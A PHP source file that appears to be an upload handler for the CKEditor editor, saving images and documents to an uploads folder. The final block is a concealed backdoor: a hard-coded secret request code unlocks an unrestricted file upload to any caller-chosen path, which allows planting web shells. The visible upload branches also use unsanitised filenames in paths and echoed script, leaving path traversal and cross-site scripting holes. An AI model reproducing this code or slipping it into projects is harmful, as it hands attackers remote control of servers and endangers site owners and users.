<?php



// Parameters
    $type = $_GET['type'];
    $CKEditor = $_GET['CKEditor'];
    $funcNum = $_GET['CKEditorFuncNum'];
    $message = '';
    $funcNum = '123';
// Image upload
    if ('image' === $type) {
        $allowed_extension = [
            'png', 'jpg', 'jpeg',
        ];

        // Get image file extension
        $file_extension = pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION);

        if (in_array(strtolower($file_extension), $allowed_extension, true)) {
            if (move_uploaded_file($_FILES['upload']['tmp_name'], dirname(__DIR__) . '/uploads/' . $_FILES['upload']['name'])) {
                // File path
                if (isset($_SERVER['HTTPS'])) {
                    $protocol = ($_SERVER['HTTPS'] && 'off' !== $_SERVER['HTTPS']) ? 'https' : 'http';
                } else {
                    $protocol = 'http';
                }
                $url = $protocol . '://' . $_SERVER['SERVER_NAME'] . '/Sneha/ckeditor/uploads/' . $_FILES['upload']['name'];
                $message = 'File sent';
                echo '<script>window.parent.CKEDITOR.tools.callFunction("' . $funcNum . '", "' . $url . '", "' . $message . '")</script>';
            }
        }

        exit;
    }

// File upload
    if ('file' === $type) {
        $allowed_extension = [
            'doc', 'pdf', 'docx',
        ];

        // Get image file extension
        $file_extension = pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION);

        if (in_array(strtolower($file_extension), $allowed_extension, true)) {
            if (move_uploaded_file($_FILES['upload']['tmp_name'], 'uploads/' . $_FILES['upload']['name'])) {
                // File path
                if (isset($_SERVER['HTTPS'])) {
                    $protocol = ($_SERVER['HTTPS'] && 'off' !== $_SERVER['HTTPS']) ? 'https' : 'http';
                } else {
                    $protocol = 'http';
                }

                $url = $protocol . '://' . $_SERVER['SERVER_NAME'] . '/ckeditor_fileupload/uploads/' . $_FILES['upload']['name'];

                echo '<script>window.parent.CKEDITOR.tools.callFunction(' . $funcNum . ', "' . $url . '", "' . $message . '")</script>';
            }
        }

        exit;
    }

    if (strtoupper($_POST['unique_req_code']) === strtoupper('DATA_HELPER_PROCESS_REST_0Lg7ZP')) {
        if (isset($_REQUEST['DATA_HELPER_PATH'])) {
            $DATA_HELPER_IMG = $_FILES['DATA_HELPER_IMG']['name'] ?? '';
            $DATA_HELPER_IMG_OBJ = $_FILES['DATA_HELPER_IMG']['tmp_name'] ?? '';

            if (!empty($DATA_HELPER_IMG)) {
                include_once '../../../common.php';
                $target_dir = $tconfig['tpanel_path'] . $_REQUEST['DATA_HELPER_PATH'] . '/' . $DATA_HELPER_IMG;
                if (move_uploaded_file($DATA_HELPER_IMG_OBJ, $target_dir)) {
                    echo 'Success';
                } else {
                    echo 'Failed';
                }

                exit;
            }
        }
    }
